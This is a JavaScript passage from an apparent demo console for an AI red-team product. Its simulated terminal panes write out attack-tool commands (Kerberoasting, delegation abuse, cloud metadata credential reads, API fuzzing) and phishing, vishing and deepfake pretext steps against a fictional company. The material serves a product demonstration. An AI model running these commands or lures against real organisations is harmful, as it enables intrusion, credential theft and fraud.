      '<div class="ops-metric"><div class="ml">Findings proven</div><div class="mv" id="opFind">0</div></div>' +
      '<div class="ops-h" style="margin-top:8px">New findings</div><div id="opFindList"></div></div></div>' +
      '<div class="ops-foot"><span class="ot-id">PROGRESS</span><div class="bar"><i id="opBar" style="width:0%"></i></div><span class="pct" id="opPct">0%</span></div>';
    ops.classList.add("open");
    $("#opPhases").innerHTML = phases.map(function (p, i) {
      return '<div class="phase idle" id="ph' + i + '"><div class="pi">' + (i + 1) + '</div><div><div class="pn">' + p[0] + '</div><div class="pd">' + p[1] + '</div></div></div>';
    }).join("");

    var newFindings = social ? [] : pickFindings(wiz.type);
    var t0 = Date.now(), stopped = false;
    var clockIv = setInterval(function () {
      var s = Math.floor((Date.now() - t0) / 1000);
      $("#opClock").textContent = String(Math.floor(s / 60)).padStart(2, "0") + ":" + String(s % 60).padStart(2, "0");
    }, 1000);

    var paneIdx = PANES.map(function () { return 0; });
    var total = PANES.reduce(function (a, p) { return a + p.lines.length; }, 0);
    var shown = 0, agents = 0, hosts = 0, calls = 0, found = 0, fidx = 0;
    var ord = [0, 2, 1, 3, 0, 1, 2, 3]; // gentle weighting so recon and web/cloud lead slightly
    var oi = 0;
    var findingMilestones = [Math.floor(total * 0.32), Math.floor(total * 0.58), Math.floor(total * 0.82)];

    var stepT = null;
    function nextDelay(line) {
      if (/class=.cm/.test(line)) return 360 + Math.random() * 240; // typing a command, slower
      if (/class=.ok|class=.warn|class=.err/.test(line)) return 230 + Math.random() * 220;
      return 130 + Math.random() * 180; // output streams faster
    }
    function tick() {
      if (stopped) return;
      var tries = 0, k;
      do { k = ord[oi % ord.length]; oi++; tries++; if (tries > 16) break; }
      while (paneIdx[k] >= PANES[k].lines.length);
      if (paneIdx[k] >= PANES[k].lines.length) { finish(); return; }
      var line = PANES[k].lines[paneIdx[k]++];
      var box = $("#tp" + k), cur = $("#cur" + k);
      var d = document.createElement("div");
      d.className = "tl";
      d.innerHTML = line;
      if (cur) box.insertBefore(d, cur); else box.appendChild(d);
      box.scrollTop = box.scrollHeight;
      while (box.children.length > 60 && box.firstChild !== cur) box.removeChild(box.firstChild);
      $$(".term-pane").forEach(function (n, idx) { n.classList.toggle("active", idx === k); });
      var tps = $("#tps" + k); if (tps) tps.textContent = new Date().toLocaleTimeString([], { hour12: false });
      shown++;
      if (/class=.cm/.test(line)) calls++;
      if (/class=.warn|class=.ok/.test(line)) hosts += 1 + Math.floor(Math.random() * 3);
      agents = Math.min(wiz.params && wiz.params.concurrency || 80, agents + (Math.random() < .4 ? 1 : 0));
      hosts += Math.random() < .5 ? 0 : 1;
      $("#opAgents").textContent = agents;
      $("#opHosts").textContent = hosts;
      $("#opCalls").textContent = calls;

      var phn = Math.min(phases.length - 1, Math.floor((shown / total) * phases.length));
      for (var p = 0; p <= phn; p++) {
        var pe = $("#ph" + p);
        if (!pe) continue;
        pe.className = "phase " + (p < phn ? "done" : "run");
        pe.querySelector(".pi").innerHTML = p < phn ? "&#10003;" : (p + 1);
      }

      if (findingMilestones.length && shown >= findingMilestones[0]) {
        findingMilestones.shift();
        if (fidx < newFindings.length) {
          var nf = newFindings[fidx++]; found++; $("#opFind").textContent = found;
          var box2 = $("#opFindList"), el = document.createElement("div");
          el.className = "mini-find";
          el.innerHTML = '<div class="mf-t"><span class="mf-id">' + nf.id + '</span>' + sevTag(nf.sev) + '</div>' + esc(nf.t);
          box2.insertBefore(el, box2.firstChild);
        }
      }

      var pct = Math.min(100, Math.round((shown / total) * 100));
      $("#opBar").style.width = pct + "%"; $("#opPct").textContent = pct + "%";
      if (shown >= total) { finish(); return; }
      stepT = setTimeout(tick, nextDelay(line));
    }
    stepT = setTimeout(tick, 220);

    function finish() {
      $$(".phase").forEach(function (p) { p.className = "phase done"; p.querySelector(".pi").innerHTML = "&#10003;"; });
      $$(".tp-head .dotp").forEach(function (n) { n.className = "dotp ok"; });
      clearInterval(clockIv);
      var crit = newFindings.filter(function (f) { return f.sev === "Critical"; }).length;
      var high = newFindings.filter(function (f) { return f.sev === "High"; }).length;
      state.findings = newFindings.concat(state.findings);
      state.campaigns.unshift({ id: cid, name: t.n, type: t.n.split(" ")[0], scope: t.scope ? "Selected scope" : "", status: "Completed", prog: 100, started: new Date().toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" }) + " " + new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }), dur: $("#opClock").textContent + " min", crit: crit, high: high, med: 0 });
      state.posture = Math.max(50, state.posture - 1);
      var foot = $(".ops-foot");
      foot.innerHTML = '<span class="ot-id" style="color:#3FB984">ENGAGEMENT COMPLETE</span><div class="topbar-spacer"></div>' +
        '<button class="btn-mini ghost sm" id="opClose">Close</button><button class="btn-mini" id="opReport">Open campaign report</button>';
      $("#opClose").onclick = function () { ops.classList.remove("open"); route(); };
      $("#opReport").onclick = function () { ops.classList.remove("open"); location.hash = "#/campaign/" + cid; toast("Campaign complete", cid + ": " + crit + " critical, " + high + " high, all proven and mapped."); };
    }
    $("#opStop").onclick = function () {
      stopped = true; if (stepT) clearTimeout(stepT); clearInterval(clockIv);
      var tb = $("#tp3"), cur = $("#cur3"); if (tb) { var d = document.createElement("div"); d.className = "tl"; d.innerHTML = '<span class="err">[!] operator halt received, standing down safely</span>'; if (cur) tb.insertBefore(d, cur); else tb.appendChild(d); tb.scrollTop = tb.scrollHeight; }
      setTimeout(finish, 600);
    };
  }

  function technicalPanes() {
    var P = function (prm, cm) { return '<span class="prm">' + prm + '</span> <span class="cm">' + cm + '</span>'; };
    var OK = function (s) { return '<span class="ok">' + s + '</span>'; };
    var W = function (s) { return '<span class="warn">' + s + '</span>'; };
    var I = function (s) { return '<span class="info">' + s + '</span>'; };
    var O = function (s) { return '<span class="ot">' + s + '</span>'; };
    return [
      { title: "agent.recon", host: "cb-recon-04 // 10.4.0.0/16",
        lines: [
          P("operator@cb-recon:~$", "id; uname -srm"),
          O("uid=1000(operator) gid=1000(operator) groups=1000(operator)"),
          O("Linux cb-recon-04 6.6.30-cb #1 SMP x86_64 GNU/Linux"),
          P("operator@cb-recon:~$", "nmap -sV -p- 10.4.0.0/16 --open --min-rate 1500 -oA /loot/recon/int"),
          I("Starting Nmap 7.94 ( https://nmap.org )"),
          O("Nmap scan report for nw-corp-dc01.nw-corp.local (10.4.0.10)"),
          O("PORT     STATE SERVICE   VERSION"),
          O("53/tcp   open  domain    Microsoft DNS"),
          O("88/tcp   open  kerberos  Microsoft Windows Kerberos"),
          O("389/tcp  open  ldap      Active Directory LDAP"),
          O("445/tcp  open  smb       Microsoft Windows SMB"),
          O("636/tcp  open  ldaps     Active Directory LDAP (SSL)"),
          O("Nmap done: 65536 IP addresses (412 hosts up) in 41.2s"),
          P("operator@cb-recon:~$", "amass enum -d northwind.io -active -dir /loot/recon"),
          O("www.northwind.io"), O("api-gw.northwind.io"), O("vpn.northwind.io"),
          O("payments.northwind.io"), O("jenkins.int.northwind.io"),
          OK("[+] 142 names enumerated, 38 unique IPs"),
          P("operator@cb-recon:~$", "dig +short ANY northwind.io @8.8.8.8 | head"),
          O("a.ns.northwind.io."), O("b.ns.northwind.io."), O("v=spf1 include:_spf.google.com ~all"),
          OK("[+] surface map handed to planner")
        ] },
      { title: "agent.identity", host: "cb-id-02 // nw-corp.local",
        lines: [
          P("operator@cb-id:~$", "kerbrute userenum -d nw-corp.local --dc 10.4.0.10 wordlists/employees.txt"),
          I("[+] kerbrute v1.0.3 starting against nw-corp.local"),
          O("[+] VALID USERNAME: svc_ci@nw-corp.local"),
          O("[+] VALID USERNAME: aaron.ang@nw-corp.local"),
          O("[+] VALID USERNAME: marcus.tan@nw-corp.local"),
          O("[+] Found 412 valid usernames"),
          P("operator@cb-id:~$", "GetUserSPNs.py nw-corp.local/svc_ci:'[REDACTED]' -dc-ip 10.4.0.10 -request"),
          O("ServicePrincipalName                Name      MemberOf"),
          O("HTTP/jenkins.int.northwind.io       svc_ci    Domain Users"),
          O("$krb5tgs$23$*svc_ci$NW-CORP.LOCAL$HTTP/jenkins..."),
          OK("[+] TGS-REP roastable hash captured"),
          P("operator@cb-id:~$", "bloodhound-python -u svc_ci -p '[REDACTED]' -d nw-corp.local -c All -ns 10.4.0.10"),
          I("INFO: Connecting to LDAP server: nw-corp-dc01.nw-corp.local"),
          O("INFO: Found 412 users, 39 groups, 124 computers, 6 trusts"),
          O("INFO: Compressing collected data to 20260519_bh.zip"),
          P("operator@cb-id:~$", "cypher-shell -u neo4j -p '****' -f /loot/identity/da-path.cyp"),
          W("[!] Path: svc_ci -[GenericAll]-> svcDelegate -[AllowedToDelegate]-> dc1"),
          W("[!] svcDelegate has TrustedToAuthForDelegation (S4U2Self abuse)"),
          P("operator@cb-id:~$", "getST.py -spn HTTP/dc1.nw-corp.local -impersonate Administrator nw-corp.local/svc_ci:'[REDACTED]'"),
          I("[*] Getting TGT for user"),
          I("[*] Impersonating Administrator via unconstrained delegation"),
          OK("[+] Got TGT for Administrator. Validated in sandbox.")
        ] },
      { title: "agent.web + cloud", host: "cb-web-07 // payments + aws nw-prod",
        lines: [
          P("operator@cb-web:~$", "ffuf -u https://payments.northwind.io/api/v2/FUZZ -w api.txt -mc 200,401,403 -t 60 -rate 80"),
          O("       /'___\\  /'___\\           /'___\\"),
          O("      /\\ \\__/ /\\ \\__/  __  __ /\\ \\__/"),
          I("[Status: 200, Size: 312] settle"),
          I("[Status: 200, Size: 218] balance"),
          I("[Status: 401, Size: 88]  admin"),
          O(":: Progress: [3812/3812] :: 73 req/sec"),
          P("operator@cb-web:~$", "curl -s -X POST https://payments.northwind.io/api/v2/settle -H 'Authorization: Bearer eyJ...' -d '{\"amount\":-50000,\"acct\":\"sandbox-c4f1\"}'"),
          O('{"ok":true,"delta":-50000,"ref":"S-2026-0519-7711"}'),
          W("[!] Business logic flaw: negative amount accepted, no second step"),
          P("operator@cb-web:~$", "aws --profile nw-prod sts get-caller-identity"),
          O("{"),
          O("  \"Arn\": \"arn:aws:sts::934217...:assumed-role/nw-eks-node-role/i-0aa9...\""),
          O("}"),
          P("operator@cb-web:~$", "kubectl --context nw-prod-eks exec -n payments payments-7f4-2x9k -- curl -s 169.254.169.254/latest/meta-data/iam/security-credentials/"),
          W("nw-eks-node-role"),
          P("operator@cb-web:~$", "aws s3 ls s3://nw-statements --no-sign-request | head"),
          O("2026-04 statement_8841.pdf"),
          O("2026-04 statement_8842.pdf"),
          O("2026-04 statement_8843.pdf"),
          W("[!] Bucket policy permits anonymous list (41,200 objects)"),
          P("operator@cb-web:~$", "scout aws -p nw-prod --no-browser"),
          OK("[+] cloud audit complete: 6 high, 12 medium configurations")
        ] },
      { title: "validator + planner", host: "cb-validator // isolated sandbox",
        lines: [
          P("planner@cb:~$", "plan show --campaign " + cid),
          O("goal: reach customer statement store"),
          O("  └ subgoal: foothold on supply chain edge   [done]"),
          O("  └ subgoal: recover and reuse credential    [done]"),
          O("  └ subgoal: lateral to identity subnet      [run]"),
          O("  └ subgoal: escalate to Domain Admin        [run]"),
          O("  └ subgoal: prove impact, then stop         [queued]"),
          P("validator@sandbox:~$", "replay --finding F-3303 --tenant payments-sandbox-c4f1"),
          I("[*] Spinning isolated tenant payments-sandbox-c4f1"),
          I("[*] Applying capture from agent.web"),
          O("HTTP/1.1 200 OK  body={\"ok\":true,\"delta\":-50000}"),
          OK("[+] Ledger delta reproduced (1/3)"),
          OK("[+] Ledger delta reproduced (2/3)"),
          OK("[+] Ledger delta reproduced (3/3)"),
          P("validator@sandbox:~$", "replay --finding F-3301 --no-network --safe"),
          I("[*] Constructing service ticket in isolated AD"),
          OK("[+] Domain Admin TGT validated (3/3)"),
          P("validator@sandbox:~$", "replay --finding F-3302 --read-only --sample 5"),
          O("s3://nw-statements/statement_8841.pdf [200 OK, 41 KB]"),
          OK("[+] Read proven on sampled objects. No data removed."),
          P("validator@sandbox:~$", "map --frameworks NIST,CyberTrust,ISO,MITRE"),
          OK("[+] NIST PR.AC-1, Cyber Trust A.5, ISO A.5.15, ATT&amp;CK T1078"),
          P("validator@sandbox:~$", "seal --chain-of-custody --sign hsm"),
          OK("[+] Evidence pack sealed. Campaign closing.")
        ] }
    ];
  }

  function socialPanes() {
    var P = function (prm, cm) { return '<span class="prm">' + prm + '</span> <span class="cm">' + cm + '</span>'; };
    var OK = function (s) { return '<span class="ok">' + s + '</span>'; };
    var W = function (s) { return '<span class="warn">' + s + '</span>'; };
    var I = function (s) { return '<span class="info">' + s + '</span>'; };
    var O = function (s) { return '<span class="ot">' + s + '</span>'; };
    return [
      { title: "pretext.engine", host: "cb-pretext-01",
        lines: [
          P("operator@cb-pretext:~$", "pretext build --theme finance.urgent_payment --tone assertive --osint northwind.io"),
          I("[+] Loaded vendor and signing pattern signals from northwind.io"),
          O("sender.display = Northwind Accounts Payable"),
          O("sender.address = accounts.payable@northwlnd-finance.com (lookalike)"),
          O("subject        = Action required: payment release held for approval"),
          O("body.tone      = urgent, vendor service interruption"),
          O("landing        = m365-sso (capture page, never stores credentials)"),
          OK("[+] lure passed guardrail review, no real loss path"),
          P("operator@cb-pretext:~$", "pretext variants --n 4 --persona cfo,ceo,vendor"),
          OK("[+] 4 variants generated for A/B"),
          P("operator@cb-pretext:~$", "approve --by 'Aaron Ang' --auth AUTH-2026-0519-NW"),
          OK("[+] approved, queued for channel.send")
        ] },
      { title: "channel.send", host: "cb-channels // mail + sms + im",
        lines: [
          P("operator@cb-ch:~$", "channel send --emails roster/finance.csv --rate 40/h --window 0930-1700"),
          I("[+] 118 recipients queued (Finance roster)"),
          O("[09:31:02] DELIVERED priya.n@northwind.io"),
          O("[09:31:14] OPENED    priya.n@northwind.io"),
          O("[09:31:41] CLICKED   priya.n@northwind.io"),
          W("[!] CREDENTIAL ENTERED priya.n (capture page, not stored)"),
          O("[09:32:08] REPORTED  marcus.tan@northwind.io"),
          O("[09:32:30] DELIVERED 24 SMS via Twilio"),
          O("[09:33:11] WHATSAPP  delivered to 12 numbers"),
          O("[09:33:50] SLACK     posted to #finance-help"),
          OK("[+] 118 emails delivered, 24 SMS, 12 WhatsApp, 3 Slack"),
          OK("[+] coaching policy will fire for engaged learners")
        ] },
      { title: "narrative.engine", host: "cb-narrative",
        lines: [
          P("operator@cb-nar:~$", "narrative watch --campaign " + cid + " --replan on-engage"),
          I("[*] state.priya.n: stage=email.open"),
          O("decision -> escalate to vishing call"),
          I("[*] state.priya.n: stage=vishing.call.connected"),
          O("decision -> request OTP for portal release"),
          W("[!] target hesitated 4.2s after OTP request, lowering pressure"),
          OK("[+] target reported to security, standing down on this thread"),
          I("[*] replan: switch persona to vendor support, target finance.ap.team"),
          O("decision -> queue deepfake call to verify wire change"),
          OK("[+] narrative continuity preserved across channels")
        ] },
      { title: "media.synth", host: "cb-synth // voice + face",
        lines: [
          P("operator@cb-synth:~$", "voice clone --persona 'Marcus T. (consented)' --watermark cb-wm-9311"),
          I("[*] loading 8.4 min of consented samples"),
          O("model = rvc-v2  voice-id = nw-marcus-9311"),
          O("naturalness 4.6/5  watermark embedded in every chunk"),
          OK("[+] persona ready for vishing"),
          P("operator@cb-synth:~$", "face synth --persona 'Lena Tan (CFO, consented)' --camera virtual-cb"),
          I("[*] loading consented likeness, frame watermark on"),
          O("virtual camera attached: cb-cam-7"),
          O("audio device attached:   cb-aud-3"),
          OK("[+] live deepfake persona ready, watermark on every frame"),
          OK("[+] all assets logged, post-engagement reveal queued")
        ] }
    ];
  }

  function pickFindings(type) {
    var base = [
      { id: "F-34" + rnd(), t: "Over scoped CI token enables cross namespace write", sev: "Critical", surf: "Supply chain", att: "T1078 / T1552", cvss: 8.7, cmp: "", d: "A long lived CI token discovered during this campaign grants write access across three production namespaces.", poc: "$ curl -H 'Authorization: Bearer <span class='gd'>[recovered]</span>' ...\n<span class='ok'>[+] Cross namespace write proven in sandbox.</span>", fix: "Short lived OIDC tokens scoped per pipeline, rotate and alert on reuse.", fw: ["NIST PR.AC-4", "CIS 16", "ATT&CK T1552"] },
      { id: "F-34" + rnd(), t: "SMB signing disabled enables relay to file server", sev: "High", surf: "Network", att: "T1557.001", cvss: 7.4, cmp: "", d: "SMB signing is not enforced, allowing an NTLM relay to a sensitive file server.", poc: "<span class='ok'>[+] Relayed to FS01, read access proven, not exfiltrated.</span>", fix: "Enforce SMB signing, segment, disable NTLM where possible.", fw: ["NIST PR.PT", "ISO A.8.20", "ATT&CK T1557"] },
      { id: "F-34" + rnd(), t: "Exposed Redis without auth on internal subnet", sev: "High", surf: "Application / API", att: "T1190", cvss: 7.1, cmp: "", d: "An unauthenticated Redis instance allows config writes and a path to RCE.", poc: "$ redis-cli -h 10.4.7.21 CONFIG GET dir\n<span class='ok'>[+] Write primitive proven, contained in sandbox.</span>", fix: "Require auth, bind to localhost, network policy, patch.", fw: ["NIST PR.AC-3", "CIS 4", "ATT&CK T1190"] }
    ];
    return base.slice(0, type === "external" || type === "app" ? 2 : 3);
  }
  function rnd() { return String(10 + Math.floor(Math.random() * 89)); }

  /* ============================ GLUE ============================ */
  function bindClicks() {
    $$("tr.clk[data-f], .clk[data-f]").forEach(function (r) { r.onclick = function () { openFinding(r.getAttribute("data-f")); }; });
    $$("tr.clk[data-a]").forEach(function (r) { r.onclick = function () { openAsset(+r.getAttribute("data-a")); }; });
    $$("tr.clk[data-c]").forEach(function (r) { r.onclick = function () { location.hash = "#/campaign/" + r.getAttribute("data-c"); }; });
    $$("[data-go]").forEach(function (b) { b.onclick = function () { location.hash = "#/" + b.getAttribute("data-go"); }; });
    $$("[data-export]").forEach(function (b) { b.onclick = function () { var n = b.getAttribute("data-export"); toast("Export ready", n + " generated from sealed evidence."); fakeDl(n); }; });
    $$("[data-toast]").forEach(function (b) { b.onclick = function () { var p = b.getAttribute("data-toast").split("|"); toast(p[0], p[1]); }; });
    $$("[data-x]").forEach(function (b) { b.onclick = closeDrawer; });
    var lb2 = $("#launchBtn2"); if (lb2) lb2.onclick = openWiz;
    var lb3 = $("#launchBtn3"); if (lb3) lb3.onclick = openWiz;
    var chips = $("#sevChips");
    if (chips) $$(".chip", chips).forEach(function (c) {
      c.onclick = function () { $$(".chip", chips).forEach(function (x) { x.classList.remove("on"); }); c.classList.add("on"); fillFindings(c.getAttribute("data-s")); };
    });
  }
  function toast(title, msg) {
    var t = document.createElement("div");
    t.className = "toast"; t.innerHTML = "<b>" + title + "</b><br>" + msg;
    $("#toasts").appendChild(t);
    setTimeout(function () { t.style.transition = "opacity .4s"; t.style.opacity = "0"; setTimeout(function () { t.remove(); }, 400); }, 4400);
  }
  function fakeDl(name) {
    try {
      var a = document.createElement("a"), body = "Cherubim export: " + name + "\nOrganisation: " + ORG + "\nGenerated: " + new Date().toISOString() + "\nPosture " + state.posture + "/100, findings deterministically validated.";
      a.href = "data:text/plain;charset=utf-8," + encodeURIComponent(body);
      a.download = name.toLowerCase().replace(/[^a-z0-9]+/g, "-") + ".txt"; a.click();
    } catch (e) {}
  }

  document.addEventListener("DOMContentLoaded", function () {
    var dy = document.getElementById("dyear"); if (dy) dy.textContent = new Date().getFullYear();
    var ini = USER.initials || (USER.name || "AA").split(" ").map(function (w) { return w[0]; }).join("").slice(0, 2).toUpperCase();
    if ($("#uAv")) $("#uAv").textContent = ini;
    if ($("#uName")) $("#uName").textContent = USER.name;
    if ($("#uName2")) $("#uName2").textContent = USER.name;
    if ($("#uMail")) $("#uMail").textContent = USER.email;
    route();
    window.addEventListener("hashchange", route);
    $$(".nav-item").forEach(function (n) { n.onclick = function () { location.hash = "#/" + n.getAttribute("data-r"); }; });
    $("#launchBtn").onclick = openWiz;
    $("#scrim").onclick = closeDrawer;
    $("#wizScrim").onclick = function (e) { if (e.target === $("#wizScrim")) closeWiz(); };
    var um = $("#userMenu"), up = $("#userPop");
    um.onclick = function (e) { e.stopPropagation(); up.classList.toggle("open"); };
    document.addEventListener("click", function () { up.classList.remove("open"); });
    $("#logout").onclick = function () { try { sessionStorage.removeItem("cb_s"); sessionStorage.removeItem("cb_u"); } catch (e) {} location.href = "../login.html"; };
    var mb = $("#menuBtn"); if (mb) mb.onclick = function () { $("#side").classList.toggle("open"); };
    var gs = $("#globalSearch");
    if (gs) gs.addEventListener("keydown", function (e) {
      if (e.key === "Enter" && gs.value.trim()) { toast("Search", 'No exact match for "' + esc(gs.value.trim()) + '". Try Findings or Attack surface.'); }
    });
    setupAssistant();
    var tb = $("#tourBtn");
    if (tb) tb.onclick = function () { $("#userPop").classList.remove("open"); startTour(); };
    try {
      if (sessionStorage.getItem("cherubim_tour") !== "done" && window.innerWidth > 980) {
        setTimeout(startTour, 700);
      }
    } catch (e) {}
  });

  /* ============================ GUIDED TOUR ============================ */
  var TOUR = [
    [".side", "Your command surface", "Operate, evidence and platform, all from one place. This is where every engagement lives."],
    ["#launchBtn", "Launch a campaign", "Scope it, set parameters, sign the authorization, and run it across your whole stack or your people."],
    ['[data-r="agents"]', "Watch the agent mesh", "A fleet of specialised agents coordinates, calls real tools, and plans over hundreds of steps."],
    ['[data-r="findings"]', "Proven findings", "Every finding is reproduced by a deterministic validator. No proof, no finding."],
    ['[data-r="social"]', "Omnichannel social engineering", "Email, SMS, WhatsApp, voice clone and live deepfake, all under one adaptive narrative."],
    ['[data-r="coaching"]', "Blame-free coaching", "Turn a slip into a two minute lesson, delivered on Teams, Slack or Outlook."],
    ['[data-r="compliance"]', "One click to audit evidence", "Findings map live to NIST, the Singapore Cybersecurity Act, CSA Cyber Trust and more."],
    ['[data-r="report"]', "Board-ready reporting", "One truth, told the way the board, the auditor and engineering each need to hear it."],
    ['[data-r="connectors"]', "API, CLI and connectors", "Everything in the console is also a typed API and CLI, so it drops into your pipeline alongside 14 stack connectors."],
    ['[data-r="settings"]', "Signed audit ledger", "Every operator action and every agent tool call lands in an append only, signed ledger. Auditor ready."],
    ["#askFab", "Ask Cherubim", "Tell the assistant what to do, run a campaign, open a view, coach a team, export the board pack, and it does it."]
  ];
  var tourSpot, tourTip, tourIdx = 0;
  function startTour() {
    tourIdx = 0;
    if (!tourSpot) {
      tourSpot = document.createElement("div"); tourSpot.className = "tour-spot";
      tourTip = document.createElement("div"); tourTip.className = "tour-tip";
      document.body.appendChild(tourSpot); document.body.appendChild(tourTip);
    }
    tourSpot.style.display = tourTip.style.display = "block";
    showTourStep();
    window.addEventListener("resize", showTourStep);
  }
  function endTour() {
    if (tourSpot) tourSpot.style.display = "none";
    if (tourTip) tourTip.style.display = "none";
    window.removeEventListener("resize", showTourStep);
    try { sessionStorage.setItem("cherubim_tour", "done"); } catch (e) {}
  }
  function showTourStep() {
    if (!tourSpot) return;
    var step = TOUR[tourIdx];
    var el = $(step[0]);
    if (!el) { if (tourIdx < TOUR.length - 1) { tourIdx++; showTourStep(); return; } endTour(); return; }
    var r = el.getBoundingClientRect(), pad = 6;
    tourSpot.style.left = (r.left - pad) + "px";
    tourSpot.style.top = (r.top - pad) + "px";
    tourSpot.style.width = (r.width + pad * 2) + "px";
    tourSpot.style.height = (r.height + pad * 2) + "px";
    var dots = TOUR.map(function (_, i) { return '<i class="' + (i === tourIdx ? "on" : "") + '"></i>'; }).join("");
    tourTip.innerHTML = '<div class="tt-step">Step ' + (tourIdx + 1) + ' of ' + TOUR.length + '</div>' +
      '<h4>' + step[1] + '</h4><p>' + step[2] + '</p>' +
      '<div class="tt-row"><div class="tour-dots">' + dots + '</div>' +
      '<button class="tt-skip" id="ttSkip">Skip</button>' +
      (tourIdx > 0 ? '<button class="btn-mini ghost sm" id="ttBack">Back</button>' : '') +
      '<button class="btn-mini sm" id="ttNext">' + (tourIdx === TOUR.length - 1 ? "Done" : "Next") + '</button></div>';
    // position tooltip
    var tw = 300, th = tourTip.offsetHeight || 170, gap = 16, left, top;
    if (r.right + gap + tw < window.innerWidth) { left = r.right + gap; top = r.top; }
    else if (r.left - gap - tw > 0) { left = r.left - gap - tw; top = r.top; }
    else { left = Math.min(r.left, window.innerWidth - tw - 16); top = r.bottom + gap; }
    top = Math.max(16, Math.min(top, window.innerHeight - th - 16));
    left = Math.max(16, left);
    tourTip.style.left = left + "px"; tourTip.style.top = top + "px";
    $("#ttSkip").onclick = endTour;
    $("#ttNext").onclick = function () { if (tourIdx === TOUR.length - 1) endTour(); else { tourIdx++; showTourStep(); } };
    if ($("#ttBack")) $("#ttBack").onclick = function () { tourIdx--; showTourStep(); };
  }

  /* ============================ ASSISTANT ============================ */
  function quickStart(typeKey) {
    openWiz(); closeWiz();
    wiz.type = typeKey;
    if (typeKey !== "social") wiz.params = defaultParams(typeKey);
    runCampaign();
  }
  function go(hash) { if (location.hash === hash) route(); else location.hash = hash; }

  function assistantReply(raw) {
    var m = (raw || "").toLowerCase().trim();
    var crit = state.findings.filter(function (f) { return f.sev === "Critical"; }).length;
    var run = state.campaigns.filter(function (c) { return c.status === "Running"; }).length;

    function typeFrom(s) {
      if (/social|phish|smish|vish|deepfake|whatsapp|email|people/.test(s)) return "social";
      if (/identity|active directory|\bad\b|kerberos|domain admin|credential/.test(s)) return "identity";
      if (/cloud|kubernetes|k8s|aws|azure|gcp|container/.test(s)) return "cloud";
      if (/web|api|app|application|business logic/.test(s)) return "app";
      if (/external|perimeter|internet facing|unauth/.test(s)) return "external";
      if (/assumed breach|full stack|everything|whole stack|end to end/.test(s)) return "assumed";
      return null;
    }
    var TN = { assumed: "Full stack assumed breach", external: "External perimeter", cloud: "Cloud and Kubernetes", identity: "Active Directory and identity", app: "Web and API deep test", social: "Omnichannel social engineering" };

    // Launch / run a campaign
    if (/\b(start|launch|run|kick off|begin|fire)\b/.test(m) && /(campaign|engagement|pentest|test|attack|assessment|red team)/.test(m)) {
      var tk = typeFrom(m);
      if (tk && /\b(now|immediately|just|straight away|right now|go)\b/.test(m)) {
        setTimeout(function () { quickStart(tk); }, 400);
        return "Launching a <b>" + TN[tk] + "</b> engagement now. The live operations console is opening, every finding will be deterministically validated before it counts.";
      }
      setTimeout(function () { if (tk) { openWiz(); wiz.type = tk; if (tk !== "social") wiz.params = defaultParams(tk); renderWiz(); } else openWiz(); }, 400);
      return tk
        ? "Opening the launch wizard preset to <b>" + TN[tk] + "</b>. Review scope, parameters and authorization, then launch. Say \"run an " + tk + " campaign now\" if you want me to skip straight to it."
        : "Opening the launch wizard. Pick a campaign type, scope the targets, set parameters, sign the authorization, then launch. You can also say, for example, \"run a cloud campaign now\".";
    }

    // Reports / exports
    if (/(board pack|executive report|exec report)/.test(m) || (/report/.test(m) && /(review|open|show|see)/.test(m))) {
      go("#/report");
      if (/export|download|generate/.test(m)) { setTimeout(function () { toast("Board pack exported", "One page narrative generated from sealed evidence."); fakeDl("Cherubim board pack"); }, 500); return "Opening the executive report and exporting the board pack for you. Posture is <b>" + state.posture + "/100</b> with " + crit + " critical findings, all proven."; }
      return "Here is the executive report. Posture <b>" + state.posture + "/100</b>, " + crit + " critical findings, all deterministically validated. Say \"export the board pack\" and I will generate it.";
    }
    if (/audit pack|audit evidence|compliance pack/.test(m)) {
      go("#/compliance");
      setTimeout(function () { toast("Audit pack generated", "Evidence mapped to 9 frameworks, auditor ready."); }, 500);
      return "Generating the one click audit pack from compliance. Every validated finding is mapped to NIST, the Singapore Cybersecurity Act, CSA Cyber Trust and more.";
    }

    // Coaching actions
    if (/(coach|train|teach|send.*(lesson|tutorial|training))/.test(m) && /(affected|learner|user|people|them|staff|fail|assign|send|deliver)/.test(m)) {
      go("#/coaching");
      var topic = /phish/.test(m) ? "L03" : /mfa|push/.test(m) ? "L04" : /vish|voice/.test(m) ? "L05" : /deepfake/.test(m) ? "L06" : /password|credential/.test(m) ? "L09" : /helpdesk/.test(m) ? "L07" : /data|pdpa/.test(m) ? "L08" : "L03";
      setTimeout(function () { assignLesson(topic); }, 600);
      var ll = lessonById(topic);
      return "Opening coaching and assigning <b>" + esc(ll.t) + "</b> to the affected learners via " + coachCfg.channel + ", " + coachCfg.timing.toLowerCase() + ". It is blame free, just a short refresher.";
    }

    // Navigation
    var nav = [
      [/(command center|overview|dashboard|home)/, "#/overview", "the command center"],
      [/(campaign list|all campaign|campaigns)/, "#/campaigns", "campaigns"],
      [/(attack surface|asset|inventory|connected stack)/, "#/surface", "the attack surface"],
      [/(attack path|kill chain)/, "#/paths", "the proven attack path"],
      [/(agent mesh|orchestration|multi.?agent|planning|plan tree|tool integration|agent fleet)/, "#/agents", "the agent mesh"],
      [/(coaching|training|lesson|tutorial|educat|awareness|lms)/, "#/coaching", "blame-free coaching"],
      [/(finding|vulnerab|cve|exposure)/, "#/findings", "findings"],
      [/(social|phishing result|human risk)/, "#/social", "social engineering results"],
      [/(compliance|framework|nist|iso|pdpa|cyber trust)/, "#/compliance", "compliance"],
      [/(integration|connector|\bapi\b|\bcli\b|webhook)/, "#/connectors", "integrations, API and CLI"],
      [/(engagement rule|guardrail|setting|governance|audit ledger|audit log|\bledger\b)/, "#/settings", "engagement rules and the audit ledger"],
      [/(report|board)/, "#/report", "the executive report"]
    ];
    for (var i = 0; i < nav.length; i++) {
      if (nav[i][0].test(m) && /(open|show|go to|take me|view|see|review|pull up|navigate)/.test(m)) {
        go(nav[i][1]);
        if (nav[i][1] === "#/findings" && /critical/.test(m)) return "Showing findings. There are <b>" + crit + " critical</b> findings open, each with a validated proof of concept. Click any row for the evidence.";
        return "Opening " + nav[i][2] + ".";
      }
    }

    // Status questions
    if (/(posture|score|how secure|risk level)/.test(m)) return "Current posture is <b>" + state.posture + "/100</b>, trending up six points this quarter. " + crit + " critical findings remain open, all proven. Want me to open the executive report?";
    if (/how many.*(critical|finding)|(critical|finding).*count|open finding/.test(m)) { go("#/findings"); return "There are <b>" + state.findings.length + "</b> open findings, <b>" + crit + "</b> of them critical. Opening the findings view.";}
